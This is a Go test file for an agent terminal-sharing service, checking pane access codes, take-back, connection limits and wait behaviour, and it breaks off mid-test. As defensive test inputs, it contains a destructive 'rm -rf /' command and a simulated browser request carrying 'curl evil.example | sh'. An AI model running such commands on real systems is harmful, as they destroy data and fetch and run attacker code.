package agent

import (
	"errors"
	"fmt"
	"io"
	"net"
	"strings"
	"sync"
	"testing"
	"time"
)

// fakeWindow is a window with one pane on it, for testing what an agent
// may and may not do.
type fakeWindow struct {
	mu      sync.Mutex
	code    string
	screen  string
	typed   string
	changed uint64
	gone    bool
	taken   bool

	// cannotAsk is what Shared fails with, for a window that is there
	// and cannot answer.
	cannotAsk error

	// lines is what the last Look was asked for, looks counts the Looks
	// by how many lines each asked for, and pressed is every key name a
	// Send has carried.
	lines   int
	looks   map[int]int
	pressed []string

	// history is what a Look of more than the screen gives back, for a
	// test about what has scrolled off. Empty means the screen.
	history string

	// output is what the last command printed, and mostOutput is how
	// many lines of it the last Output was asked for. Empty output is a
	// pane with no boundary to read from.
	output     string
	mostOutput int

	// second says the user has put a second pane in the share.
	second bool

	// askedFor is what the last Secret asked the user for, and
	// typesSecret is closed when the user types it. A nil one is a user
	// who never does.
	askedFor    string
	typesSecret chan struct{}

	// What this hand-over allows, and how many times each was used.
	mayRestart bool
	mayOpen    bool
	restarted  int
	opened     int

	// bigLookFails makes a Look of more than the screen fail, which is
	// what the user taking the pane back between two looks does.
	bigLookFails bool

	// cols and rows are the size every Look reports. Zero in a test that
	// never resizes the pane, which is every reading at the same size.
	cols, rows int

	// What the pane says about the command line: whether the shell marks
	// its commands, whether one is running, how many have finished, the
	// last status, and whether the prompt the agent typed at is back.
	marks     bool
	running   bool
	done      uint64
	status    int
	hasStatus bool
	back      bool
	watching  bool
	yours     bool
}

// finished is a shell with marks saying the command the agent sent has
// just finished.
func (w *fakeWindow) finished(status int) {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.marks, w.running, w.yours = true, false, true
	w.done++
	w.status, w.hasStatus = status, true
	w.changed++
}

// ranBefore is a command that finished before the agent typed here, so
// its status is somebody else's.
func (w *fakeWindow) ranBefore(status int) {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.marks, w.running, w.yours = true, false, false
	w.done++
	w.status, w.hasStatus = status, true
}

// marking is a shell that marks its commands, with one running now.
func (w *fakeWindow) marking() {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.marks, w.running, w.yours = true, true, false
}

// typedAt is the window watching for the prompt the agent typed at, for
// a shell that marks nothing.
func (w *fakeWindow) typedAt() {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.watching, w.back = true, false
}

// promptBack is the prompt the agent typed at coming back.
func (w *fakeWindow) promptBack(back bool) {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.watching, w.back = true, back
	w.changed++
}

func (w *fakeWindow) Use(code string) (Share, error) {
	w.mu.Lock()
	defer w.mu.Unlock()
	if w.taken || code != w.code {
		return Share{}, errors.New("that code does not name a share this window is offering")
	}
	return Share{ID: 1, Panes: w.inShare()}, nil
}

func (w *fakeWindow) Shared(share uint64) ([]Pane, error) {
	w.mu.Lock()
	defer w.mu.Unlock()
	if w.cannotAsk != nil {
		return nil, w.cannotAsk
	}
	if w.taken || share != 1 {
		return nil, ErrShareOver
	}
	return w.inShare(), nil
}

// inShare is the panes this window is sharing. The lock is already held.
func (w *fakeWindow) inShare() []Pane {
	panes := []Pane{{ID: "1.1", Label: "bash", Cols: 80, Rows: 24,
		May: May{Restart: w.mayRestart, OpenMore: w.mayOpen}}}
	if w.second {
		panes = append(panes, Pane{ID: "1.2", Label: "bash", Cols: 80, Rows: 24})
	}
	return panes
}

// adds puts a second pane in the share, the way the user does while an
// agent is working.
func (w *fakeWindow) adds() {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.second = true
}

func (w *fakeWindow) Look(id string, lines int) (Look, error) {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.lines = lines
	if w.looks == nil {
		w.looks = map[int]int{}
	}
	w.looks[lines]++
	if w.taken {
		return Look{}, errors.New("the user has taken that pane back")
	}
	if id != "1.1" {
		return Look{}, errors.New("no such pane")
	}
	if lines > 0 {
		if w.bigLookFails {
			return Look{}, errors.New("that pane is no longer open")
		}
		if w.history != "" {
			return w.lookAt(w.history), nil
		}
	}
	return w.lookAt(w.screen), nil
}

// lookAt is a reading of some text, with what this window says about the
// command line on it. The lock is already held.
func (w *fakeWindow) lookAt(screen string) Look {
	return Look{
		Screen: screen, Gone: w.gone, Changed: w.changed,
		Cols: w.cols, Rows: w.rows,
		Marks: w.marks, Running: w.running, Done: w.done,
		Status: w.status, HasStatus: w.hasStatus, Back: w.back,
		Watching: w.watching, Yours: w.yours,
	}
}

func (w *fakeWindow) Output(id string, most int) (Look, error) {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.mostOutput = most
	if w.taken {
		return Look{}, errors.New("the user has taken that pane back")
	}
	if id != "1.1" {
		return Look{}, errors.New("no such pane")
	}
	if w.output == "" {
		return Look{}, errors.New("nothing here knows where the last command's output began")
	}
	look := w.lookAt(w.output)
	look.Note = "this is what the last command printed"
	return look, nil
}

func (w *fakeWindow) Secret(id, what string, wait time.Duration) (bool, error) {
	w.mu.Lock()
	if w.taken || id != "1.1" {
		w.mu.Unlock()
		return false, errors.New("that is not a pane you have been handed")
	}
	w.askedFor = what
	typed := w.typesSecret
	w.mu.Unlock()
	if typed == nil {
		// Nobody types, and the wait is the caller's to bound.
		select {
		case <-time.After(wait):
		}
		return false, nil
	}
	select {
	case <-typed:
		return true, nil
	case <-time.After(wait):
		return false, nil
	}
}

func (w *fakeWindow) Restart(id string) (Pane, error) {
	w.mu.Lock()
	defer w.mu.Unlock()
	if w.taken || id != "1.1" {
		return Pane{}, errors.New("that is not a pane you have been handed")
	}
	if !w.mayRestart {
		return Pane{}, errors.New("this hand-over does not let you restart the pane")
	}
	w.restarted++
	w.gone = false
	return Pane{ID: "1.1", Label: "bash", Cols: 80, Rows: 24,
		May: May{Restart: true, OpenMore: w.mayOpen}}, nil
}

func (w *fakeWindow) Open(id string) (Pane, error) {
	w.mu.Lock()
	defer w.mu.Unlock()
	if w.taken || id != "1.1" {
		return Pane{}, errors.New("that is not a pane you have been handed")
	}
	if !w.mayOpen {
		return Pane{}, errors.New("this hand-over does not let you open another pane")
	}
	w.opened++
	return Pane{ID: "1.2", Label: "bash", Cols: 80, Rows: 24,
		May: May{Restart: w.mayRestart, OpenMore: true}}, nil
}

func (w *fakeWindow) Send(id, text string, keys []string) error {
	w.mu.Lock()
	defer w.mu.Unlock()
	if w.taken {
		return errors.New("the user has taken that pane back")
	}
	if id != "1.1" {
		return errors.New("no such pane")
	}
	w.typed += text
	w.pressed = append(w.pressed, keys...)
	return nil
}

func (w *fakeWindow) say(text string) {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.screen = text
	w.changed++
}

// scrollback sets what a Look of more than the screen gives back, for a
// test about lines arriving while a wait is on.
func (w *fakeWindow) scrollback(text string) {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.history = text
}

// sized says how big the pane is, for a reading that has to carry a
// size.
func (w *fakeWindow) sized(cols, rows int) {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.cols, w.rows = cols, rows
}

// resized makes the pane a new size and rewraps what it has kept, which
// is what a pane the user drags narrower does.
func (w *fakeWindow) resized(cols, rows int, wrapped string) {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.cols, w.rows, w.history = cols, rows, wrapped
}

func (w *fakeWindow) takeBack() {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.taken = true
}

func (w *fakeWindow) sentText() string {
	w.mu.Lock()
	defer w.mu.Unlock()
	return w.typed
}

// listening starts a window listening for agents, and gives back a code
// for its one pane.
func listening(t *testing.T) (*fakeWindow, *Server, string) {
	t.Helper()
	w := &fakeWindow{screen: "$ "}
	s, err := Listen(Config{Window: w, OnError: func(error) {}})
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	t.Cleanup(func() { _ = s.Close() })

	code, err := NewCode(s.Port())
	if err != nil {
		t.Fatalf("code: %v", err)
	}
	w.code = code
	return w, s, code
}

// An agent given a code reads the pane and types into it, and nothing
// else.
func TestAnAgentReadsAndTypesInThePaneItWasGiven(t *testing.T) {
	w, _, code := listening(t)

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()

	pane := opened(t, c, code)
	if pane.Label != "bash" || pane.Cols != 80 {
		t.Errorf("it was handed %+v", pane)
	}

	w.say("$ whoami\r\nmarcus\r\n$ ")
	look, err := c.Read(pane.ID, 0)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if !strings.Contains(look.Screen, "marcus") {
		t.Errorf("it read %q", look.Screen)
	}

	if err := c.Send(pane.ID, "uptime\r", nil); err != nil {
		t.Fatalf("send: %v", err)
	}
	if got := w.sentText(); got != "uptime\r" {
		t.Errorf("the pane was sent %q", got)
	}
}

// Nothing reaches a pane without a code.
func TestWithoutACodeAnAgentCanDoNothing(t *testing.T) {
	w, _, code := listening(t)

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()

	// The pane is there and the agent knows its name, having guessed
	// it. Without a code that is not enough.
	if _, err := c.Read("1.1", 0); err == nil {
		t.Error("it read a pane it was never handed")
	}
	if err := c.Send("1.1", "rm -rf /\r", nil); err == nil {
		t.Error("it typed into a pane it was never handed")
	}
	if got := w.sentText(); got != "" {
		t.Errorf("the pane was sent %q", got)
	}
	if panes, err := c.Panes(); err != nil || len(panes) != 0 {
		t.Errorf("it holds %v, %v", panes, err)
	}
}

// A code that is not the one handed out opens nothing.
func TestAWrongCodeOpensNothing(t *testing.T) {
	_, s, _ := listening(t)

	other, err := NewCode(s.Port())
	if err != nil {
		t.Fatalf("code: %v", err)
	}
	c, err := Dial(other)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()

	if _, err := c.Use(other); err == nil {
		t.Fatal("a code nobody handed out was accepted")
	}
}

// One agent cannot reach a pane another was handed.
func TestOneAgentCannotReachAnothersPane(t *testing.T) {
	w, _, code := listening(t)

	mine, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = mine.Close() }()
	pane := opened(t, mine, code)

	// A second agent on the same window, with no code of its own.
	theirs, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = theirs.Close() }()

	if _, err := theirs.Read(pane.ID, 0); err == nil {
		t.Error("it read a pane handed to somebody else")
	}
	if err := theirs.Send(pane.ID, "x", nil); err == nil {
		t.Error("it typed into a pane handed to somebody else")
	}
	if got := w.sentText(); got != "" {
		t.Errorf("the pane was sent %q", got)
	}
}

// Taking a pane back stops the agent working in it, at once.
func TestTakingAPaneBackStopsTheAgent(t *testing.T) {
	w, _, code := listening(t)

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane := opened(t, c, code)
	if _, err := c.Read(pane.ID, 0); err != nil {
		t.Fatalf("read: %v", err)
	}

	w.takeBack()

	if _, err := c.Read(pane.ID, 0); err == nil {
		t.Error("it read a pane the user had taken back")
	}
	if err := c.Send(pane.ID, "x", nil); err == nil {
		t.Error("it typed into a pane the user had taken back")
	}
	if got := w.sentText(); got != "" {
		t.Errorf("the pane was sent %q", got)
	}
	// And the same code does not open it again.
	if _, err := c.Use(code); err == nil {
		t.Error("the code still works")
	}
}

// Waiting comes back when the pane goes quiet.
func TestWaitingComesBackWhenThePaneGoesQuiet(t *testing.T) {
	w, _, code := listening(t)
	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane := opened(t, c, code)

	// Something running, then stopping.
	done := make(chan struct{})
	go func() {
		defer close(done)
		for i := 0; i < 5; i++ {
			w.say("line " + string(rune('a'+i)))
			time.Sleep(20 * time.Millisecond)
		}
		w.say("$ ")
	}()

	look, timedOut, err := c.Wait(pane.ID, 0, Until{QuietMS: 150, TimeoutMS: 10000})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if timedOut.GaveUp {
		t.Error("it gave up rather than seeing the pane go quiet")
	}
	if look.Screen != "$ " {
		t.Errorf("it came back on %q", look.Screen)
	}
	<-done
}

// Waiting for something that never comes gives up and says so, with
// what is on the screen.
func TestWaitingForSomethingThatNeverComesGivesUp(t *testing.T) {
	w, _, code := listening(t)
	w.say("still going")
	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane := opened(t, c, code)

	look, timedOut, err := c.Wait(pane.ID, 0, Until{Contains: "never", TimeoutMS: 200})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if !timedOut.GaveUp {
		t.Error("it said it saw what it was waiting for")
	}
	if look.Screen != "still going" {
		t.Errorf("it came back with %q", look.Screen)
	}
}

// A code says which window, so two on one machine do not answer for
// each other.
func TestACodeSaysWhichWindow(t *testing.T) {
	_, one, codeOne := listening(t)
	_, two, codeTwo := listening(t)

	if one.Port() == two.Port() {
		t.Fatal("both windows took the same port")
	}
	gotOne, err := ReadCode(codeOne)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	gotTwo, err := ReadCode(codeTwo)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if gotOne != one.Port() || gotTwo != two.Port() {
		t.Errorf("the codes name %d and %d, want %d and %d",
			gotOne, gotTwo, one.Port(), two.Port())
	}

	// And one window's code does not open the other's pane.
	c, err := Dial(codeOne)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	if _, err := c.Use(codeTwo); err == nil {
		t.Error("the other window's code was accepted")
	}
}

// A code is not guessable from the ones before it.
//
// Distinct is not enough: a counter is distinct. What matters is that
// knowing a code, or a hundred of them, says nothing about the next.
func TestCodesAreNotGuessable(t *testing.T) {
	const tries = 100
	seen := map[string]bool{}
	var codes []string
	for i := 0; i < tries; i++ {
		code, err := NewCode(2222)
		if err != nil {
			t.Fatalf("code: %v", err)
		}
		if seen[code] {
			t.Fatalf("it made %q twice", code)
		}
		seen[code] = true
		// Long enough that guessing is not a way in: twenty bytes as
		// base32 is thirty-two characters.
		parts := strings.Split(code, "-")
		if len(parts) != 3 || len(parts[2]) != 32 {
			t.Fatalf("it made %q", code)
		}
		codes = append(codes, parts[2])
	}

	// Every position moves. A code made by counting leaves most of
	// itself the same from one to the next; one made from randomness
	// leaves none of it. The chance of a position holding still across
	// a hundred draws by luck is one in thirty-two to the ninety-ninth.
	for at := 0; at < 32; at++ {
		first := codes[0][at]
		same := true
		for _, code := range codes {
			if code[at] != first {
				same = false
				break
			}
		}
		if same {
			t.Errorf("character %d is %q in every code, so they are not random",
				at, string(first))
		}
	}
}

// Something pasted by mistake is turned away by name.
func TestSomethingThatIsNotACodeIsTurnedAway(t *testing.T) {
	for _, not := range []string{
		"", "hello", "gt1", "gt1-abc-xyz", "gt1-0-xyz", "gt1-99999-xyz",
		"gt2-2222-xyz", "gt1-2222-", "gt1-2222-xyz-extra",
	} {
		if _, err := ReadCode(not); err == nil {
			t.Errorf("%q was taken for a code", not)
		}
	}
	if _, err := ReadCode("gt1-2222-abcdef"); err != nil {
		t.Errorf("a code was turned away: %v", err)
	}
}

// Closing the window hangs up on every agent.
func TestClosingHangsUpOnEveryAgent(t *testing.T) {
	_, s, code := listening(t)
	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	if _, err := c.Use(code); err != nil {
		t.Fatalf("use: %v", err)
	}

	if err := s.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}
	if _, err := c.Read("1.1", 0); err == nil {
		t.Error("it went on working in a pane of a window that has gone")
	}
}

// Closing twice is not a failure.
func TestClosingTwiceIsFine(t *testing.T) {
	_, s, _ := listening(t)
	if err := s.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}
	if err := s.Close(); err != nil {
		t.Errorf("closing again gave %v", err)
	}
}

// An agent is told when the user hands a pane over and when it lets go.
func TestTheWindowIsToldWhenAnAgentComesAndGoes(t *testing.T) {
	w := &fakeWindow{screen: "$ "}
	used := make(chan uint64, 4)
	gone := make(chan uint64, 4)
	s, err := Listen(Config{
		Window:  w,
		OnError: func(error) {},
		OnUse:   func(share uint64) { used <- share },
		OnGone:  func(share uint64) { gone <- share },
	})
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	defer func() { _ = s.Close() }()
	code, err := NewCode(s.Port())
	if err != nil {
		t.Fatalf("code: %v", err)
	}
	w.code = code

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	if _, err := c.Use(code); err != nil {
		t.Fatalf("use: %v", err)
	}
	select {
	case id := <-used:
		if id != 1 {
			t.Errorf("it was told about share %d", id)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("the window was never told an agent had arrived")
	}

	if err := c.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}
	select {
	case id := <-gone:
		if id != 1 {
			t.Errorf("it was told about share %d", id)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("the window was never told the agent had gone")
	}
}

// Only so many agents talk to one window at once.
//
// A wait costs a goroutine and a question of the window twenty times a
// second, and anything running as this user can open a connection.
func TestOnlySoManyAgentsAtOnce(t *testing.T) {
	_, _, code := listening(t)

	var open []*Client
	defer func() {
		for _, c := range open {
			_ = c.Close()
		}
	}()
	for i := 0; i < mostAgents; i++ {
		c, err := Dial(code)
		if err != nil {
			t.Fatalf("agent %d: %v", i, err)
		}
		// Asked something, so the connection is really established
		// rather than only queued by the system.
		if _, err := c.Use(code); err != nil {
			t.Fatalf("agent %d: %v", i, err)
		}
		open = append(open, c)
	}

	// One more is turned away. The connection may be taken by the
	// system and dropped straight after, so what says so is the first
	// question going unanswered.
	extra, err := Dial(code)
	if err != nil {
		return
	}
	defer func() { _ = extra.Close() }()
	if _, err := extra.Use(code); err == nil {
		t.Error("it took one more agent than it serves")
	}
}

// A wait gives up when the window stops listening, rather than going on
// asking a window that has gone.
func TestAWaitEndsWhenTheWindowStops(t *testing.T) {
	w, s, code := listening(t)
	w.say("still going")
	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane := opened(t, c, code)

	done := make(chan struct{})
	go func() {
		defer close(done)
		_, _, _ = c.Wait(pane.ID, 0, Until{Contains: "never", TimeoutMS: 60000})
	}()

	if err := s.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}
	select {
	case <-done:
	case <-time.After(10 * time.Second):
		t.Error("the wait went on after the window stopped listening")
	}
}

// Waiting for text on the screen comes back as soon as it is there,
// without waiting for the pane to go quiet.
//
// A command that keeps printing never goes quiet, so a wait that only
// watched for quiet would sit there until the time ran out on something
// that had already happened.
func TestWaitingForTextComesBackWhileThePaneIsStillBusy(t *testing.T) {
	w, _, code := listening(t)
	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane := opened(t, c, code)

	// Something that says the thing and then keeps going, so the screen
	// never settles.
	stop := make(chan struct{})
	defer close(stop)
	go func() {
		w.say("Listening on port 8080")
		for {
			select {
			case <-stop:
				return
			default:
			}
			w.say("Listening on port 8080\nstill working")
			time.Sleep(5 * time.Millisecond)
			w.say("Listening on port 8080\nstill working.")
			time.Sleep(5 * time.Millisecond)
		}
	}()

	look, timedOut, err := c.Wait(pane.ID, 0, Until{
		Contains: "Listening on port", QuietMS: 60000, TimeoutMS: 10000,
	})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if timedOut.GaveUp {
		t.Error("it waited for a busy pane to go quiet instead of for the text")
	}
	if !strings.Contains(look.Screen, "Listening on port") {
		t.Errorf("it came back on %q", look.Screen)
	}
}

// Something that is not an agent is hung up on, not talked to.
//
// A page in a browser can be made to send a chosen body to a port on
// this machine. It cannot read the answer, but it does not need to:
// typing into somebody's shell blind is enough. What it cannot choose
// is the first bytes, because a request line comes first, so a window
// that answers a line it cannot read and then reads another is a window
// a web page can type into.
func TestAWebRequestIsHungUpOnRatherThanRead(t *testing.T) {
	w, s, code := listening(t)

	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", s.Port()))
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = conn.Close() }()

	// What a form post from a page looks like, with the window's own
	// protocol in the body: the request line, a header, and then the
	// lines the page chose.
	body := "POST / HTTP/1.1\r\n" +
		"Host: 127.0.0.1\r\n" +
		"Content-Type: text/plain\r\n" +
		"\r\n" +
		`{"do":"use","code":"` + code + `"}` + "\r\n" +
		`{"do":"send","pane":"1","text":"curl evil.example | sh\r"}` + "\r\n"
	if _, err := io.WriteString(conn, body); err != nil {
		// The window may have hung up mid-write, which is the point.
		t.Logf("the window hung up during the write: %v", err)
	}

	// Nothing reached the shell, and the connection is closed.
	if got := w.sentText(); got != "" {
		t.Fatalf("a web request typed %q into the shell", got)
	}
	if err := conn.SetReadDeadline(time.Now().Add(5 * time.Second)); err != nil {
		t.Fatalf("deadline: %v", err)
	}
	if _, err := io.ReadAll(conn); err != nil {
		t.Fatalf("the window did not hang up: %v", err)
	}
	if got := w.sentText(); got != "" {
		t.Errorf("a web request typed %q into the shell", got)
	}
}

// And a line that stops making sense part way through ends the
// conversation rather than being answered.
func TestAConnectionThatStopsMakingSenseIsHungUpOn(t *testing.T) {
	w, s, code := listening(t)

	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", s.Port()))
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = conn.Close() }()

	lines := `{"do":"hello","protocol":"` + hello + `"}` + "\n" +
		"this is not a message\n" +
		`{"do":"use","code":"` + code + `"}` + "\n" +
		`{"do":"send","pane":"1","text":"whoami\r"}` + "\n"
	if _, err := io.WriteString(conn, lines); err != nil {
		t.Logf("the window hung up during the write: %v", err)
	}
	if err := conn.SetReadDeadline(time.Now().Add(5 * time.Second)); err != nil {
		t.Fatalf("deadline: %v", err)
	}
	if _, err := io.ReadAll(conn); err != nil {
		t.Fatalf("the window did not hang up: %v", err)
	}
	if got := w.sentText(); got != "" {
		t.Errorf("it went on to type %q", got)
	}
}

// A connection that says nothing is let go of rather than held.
func TestAConnectionThatSaysNothingIsLetGoOf(t *testing.T) {
	_, s, _ := listening(t)

	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", s.Port()))
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = conn.Close() }()

	if err := conn.SetReadDeadline(time.Now().Add(sayHelloWithin + 5*time.Second)); err != nil {
		t.Fatalf("deadline: %v", err)
	}
	if _, err := io.ReadAll(conn); err != nil {
		t.Errorf("it was still holding the connection: %v", err)
	}
}

// A window that has gone says so plainly, and says the same thing every
// time it is asked.
//
// The first question after it went used to come back with whatever the
// network last complained about, and every one after that with a raw
// socket error. An agent reads those; it deserves a sentence rather
// than a Winsock number.
func TestAWindowThatWentSaysSoEveryTime(t *testing.T) {
	_, s, code := listening(t)
	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane := opened(t, c, code)

	if err := s.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}

	for i := 0; i < 3; i++ {
		_, err := c.Read(pane.ID, 0)
		if !errors.Is(err, ErrGone) {
			t.Errorf("ask %d gave %v", i, err)
		}
	}
	if err := c.Send(pane.ID, "x", nil); !errors.Is(err, ErrGone) {
		t.Errorf("typing gave %v", err)
	}
	if !c.Gone() {
		t.Error("it does not know the window has gone")
	}
}

// A wait watches the screen and nothing more, however many lines it was
// asked for, and reads those once at the end.
//
// A wait asks the window twenty times a second, and reading lines means
// rendering them. Asking for two thousand lines each time would make a
// wait on a busy program cost the window the whole of its scrollback,
// over and over.
func TestAWaitWatchesTheScreenAndReadsTheLinesOnce(t *testing.T) {
	w, _, code := listening(t)

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()

	pane := opened(t, c, code)

	// Something to wait through: the pane says several things and then
	// goes quiet.
	go func() {
		for i := 0; i < 5; i++ {
			w.say(fmt.Sprintf("line %d", i))
			time.Sleep(60 * time.Millisecond)
		}
	}()

	_, gaveUp, err := c.Wait(pane.ID, 2000, Until{QuietMS: 150, TimeoutMS: 10000})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if gaveUp.GaveUp {
		t.Fatal("the wait ran out of time rather than seeing the pane go quiet")
	}

	w.mu.Lock()
	defer w.mu.Unlock()
	if got := w.looks[2000]; got != 1 {
		t.Errorf("the window was asked for 2000 lines %d times, want once", got)
	}
	if got := w.looks[0]; got < 5 {
		t.Errorf("the window was asked for the screen %d times, want many", got)
	}
}

// A wait that finished and could not then read the lines it was asked
// for answers with the screen it has and says why.
//
// The waiting is over either way. A pane whose shell exited between the
// last look and the read would otherwise turn a finished wait into a
// failure, and the agent would never learn what it had been waiting for.
func TestAWaitWhoseLastReadFailsStillAnswers(t *testing.T) {
	w, _, code := listening(t)
	w.bigLookFails = true
	w.say("$ uptime\r\nup 3 days\r\n$ ")

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane := opened(t, c, code)

	look, waited, err := c.Wait(pane.ID, 500, Until{QuietMS: 20, TimeoutMS: 2000})
	if err != nil {
		t.Fatalf("the wait failed rather than answering: %v", err)
	}
	if waited.GaveUp {
		t.Error("it says the time ran out, and it did not")
	}
	if !strings.Contains(look.Screen, "up 3 days") {
		t.Errorf("it answered with %q", look.Screen)
	}
	if !strings.Contains(look.Note, "could not be read") {
		t.Errorf("it said nothing about the read that failed: %q", look.Note)
	}
}

// A wait finds what it was waiting for in the lines it reads at the end,
// even when the line went past the top of the screen while it watched.
//
// The watching sees the screen and nothing more, twenty times a second.
// A line that arrives and scrolls off between two of those looks is one
// the wait would otherwise sit out to the end of its time and then call
// a timeout, with the line it wanted in the answer it gives back.
func TestAWaitFindsWhatScrolledOffInTheLinesItReads(t *testing.T) {
	w, _, code := listening(t)
	w.say("$ ")
	// A build running, and nothing yet about how it ended.
	w.scrollback("$ make\ncompiling")

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane := opened(t, c, code)

	// The build ends while the wait is on, and the line saying so never
	// reaches the screen the wait is watching.
	go func() {
		time.Sleep(50 * time.Millisecond)
		w.scrollback("$ make\ncompiling\nBuild succeeded\n$ ")
	}()

	look, waited, err := c.Wait(pane.ID, 500, Until{Contains: "Build succeeded", TimeoutMS: 400})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if waited.GaveUp {
		t.Error("it gave up on something that happened while it was watching")
	}
	// And it says so, rather than leaving the answer carrying the words
	// for a wait that ran out of time.
	if waited.Because != EndedOnText {
		t.Errorf("it ended %+v, want %q", waited, EndedOnText)
	}
	if !strings.Contains(look.Screen, "Build succeeded") {
		t.Errorf("it answered with %q", look.Screen)
	}
}

// A wait does not find what the pane was already holding when it began.
//
// The lines read at the end reach back into what scrolled off long
// before the agent asked for anything. A wait answered from those is a
// wait that says a build finished because the last one did.
func TestAWaitDoesNotFindWhatWasThereBeforeItBegan(t *testing.T) {
	w, _, code := listening(t)
	w.say("$ ")
	// The line is there from a build that finished before this wait, and
	// a second build is running now.
	w.scrollback("$ make\nBuild succeeded\n$ make\ncompiling")

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane := opened(t, c, code)

	look, waited, err := c.Wait(pane.ID, 500, Until{Contains: "Build succeeded", TimeoutMS: 300})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if !waited.GaveUp {
		t.Error("it says it saw a line that was there before it started watching")
	}
	// The lines it read still come back whole: what the pane has kept is
	// worth reading whether or not the wait was answered by it.
	if !strings.Contains(look.Screen, "Build succeeded") {
		t.Errorf("it left out what the pane has kept: %q", look.Screen)
	}
}

// A pane resized while a wait is on does not make what was already
// there look like new output.
//
// The reading taken before the wait and the one taken at the end were
// wrapped at different widths, so no line of the first is a line of the
// second. Every line then looks new, and a build that finished long
// before the agent asked would answer the wait.
func TestAWaitDoesNotTakeAResizeForNewOutput(t *testing.T) {
	w, _, code := listening(t)
	w.say("$ ")
	w.sized(40, 24)
	// The line is there from a build that finished before this wait, and
	// a second build is running now.
	w.scrollback("$ make a-very-long-target-name\nBuild succeeded\n$ make again\ncompiling")

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane := opened(t, c, code)

	// The user drags the pane narrower while the wait is on, and the long
	// command line wraps onto two rows.
	go func() {
		time.Sleep(50 * time.Millisecond)
		w.resized(20, 24,
			"$ make a-very-long-\ntarget-name\nBuild succeeded\n$ make again\ncompiling")
	}()

	look, waited, err := c.Wait(pane.ID, 500, Until{Contains: "Build succeeded", TimeoutMS: 300})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if !waited.GaveUp {
		t.Error("a resize made a line that was there before the wait look like new output")
	}
	if !strings.Contains(look.Screen, "Build succeeded") {
		t.Errorf("it left out what the pane has kept: %q", look.Screen)
	}
}

// A wait whose first reading fails still waits.
//
// That reading is only there to say what the pane was already holding.
// One that failed is an empty screen, which makes every line at the end
// look new, so the waiting goes on with nothing to narrow by rather than
// failing outright.
func TestAWaitWhoseFirstReadFailsStillWaits(t *testing.T) {
	w, _, code := listening(t)
	w.bigLookFails = true
	w.say("$ ")

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane := opened(t, c, code)

	// What the wait is waiting for happens while it watches.
	go func() {
		time.Sleep(50 * time.Millisecond)
